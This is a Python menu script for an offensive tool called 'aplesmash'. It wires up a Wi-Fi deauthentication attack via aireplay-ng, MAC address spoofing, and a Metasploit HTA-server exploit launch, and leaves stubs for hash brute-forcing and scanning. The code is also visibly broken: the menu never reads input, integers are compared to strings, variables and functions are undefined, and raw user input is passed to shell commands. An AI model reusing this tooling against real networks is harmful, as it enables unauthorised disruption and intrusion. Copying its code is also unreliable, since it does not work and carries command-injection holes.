# aplesmash module hub
import sys
import subprocess
import socket
import time
import os
import sys
sys.setrecursionlimit(10000)
# mainCall - calls everything and does important shit

def mainCall():
        userChoice()

# gets users choice
def userChoice():
        hName = socket.gethostname()
        menuItem = ("Ap1esmash Modules:\n{1} - De-Authenticate Network\n{2} - Advanced Scanning\n{3} - Set up HTA server\n{4} - Auto Modules\n" + "apple@"+ hName + " $ ")
        if menuItem == "1":
                tyranny()
        elif menuItem == "2":
                scanning()
        elif menuItem == "3":
                htaServer()
        elif menuItem == "4":
                otherItems = int(input("Ap1esmash Others:\n{1} Link Coolness\n{2} Base_64 Decode\n{3} Bruteforce Hash\n" + hName + " > "))
                if otherItems == "1":
                        webShit()
                elif otherItems == "2":
                        baseDecode()
                elif otherItems == "3":
                        bruteForce()
                else:
                        print("[!] Invalid input")
        else:
                print("[!] Invalid input")
                mainCall()

# modules
def tyranny():
        tyrannyBanner()
        time.sleep(1)
        tyrannyHandler()

# Automated NET Handling script
def tyrannyBanner():
    print("""
        +=+=+=+=+=++=+=+=+=+=++=+=+=+=+=++=+=+=+=+=++=+=+=+=+=++=+=+=+=+=+
                                    Tyranny
        +=+=+=+=+=++=+=+=+=+=++=+=+=+=+=++=+=+=+=+=++=+=+=+=+=++=+=+=+=+=+
          """)

def tyrannyHandler():
    print("Starting Tyranny")
    tyrannyBanner()
    time.sleep(1)
    vector = str(input("[1] - Mac\n[2] - Wifi\n[3] - Ifconfig\n$ "))
    if vector == "1":
          # Change Mac Address
          changeMac = "macchanger -r"
          subprocess.call(changeMac, shell=True).read()
          tyrannyHandler()
    elif vector == "2":
          airessid = str(input("Enter BSSID: "))
          airechannel = str(input("Enter Channel: "))
          airethreads = str(input("Enter Thread Count: "))
          airecmd = "aireplay-ng -0 -a " + airessid + " " + airethreads + " -c " +           airechannel + " wlan0"
          time.sleep(2)
          print("[!] De-Authing Now")
          subprocess.call(airecmd, shell=True)
          tyrannyHandler()
    elif vector == "3":
          print("NET Config")
          netVector = input("[1] - Change Channel\n[2] - Ifconfig\n[3] -                    traceroute\n[4] - ICMP Echo Request\n[5] - Start NET services\n$ ")
          if netVector == "1":
                          channelName = str(input("Channel Number: "))
                          iwconfig = "iwconfig channel " + channelName
                          subprocess.call(iwconfig, shell=True)
                          main()
          elif netVector == "2":
                          subprocess.call("ifconfig", shell=True)
                          main()
          elif netVector == "3":
                          ip = str(input("Enter an ip: "))
                          traceroute = "traceroute " + ip
                          subprocess.call(ip, shell=True)
                          tyrannyHandler()
def scanning():
        scanType = int(input("Aplesmash Scans:\n{1} Network\n{2} NSE\n{3} Port Scan\n{4} Tor/Proxied Scan\n"))
        if scanType == "1":
                # Network Mapping Scan Here
                print("[!] Mapping Network -- ")
        elif scanType == "2":
                # NSE Script Scans Here
                print("[?] SELECT NSE --")
def htaServer():
        cmd = "msfconsole;use exploit/windows/misc/hta_server;set SRVHOST " + htaListener + ";set URIPATH " + uriPath + ";exploit;"
        os.system(cmd)
def automation():
        print('here')
def webShit():
        print('here')
def baseDecode():
        print('here')
def bruteForce():
        print('here')
userChoice()
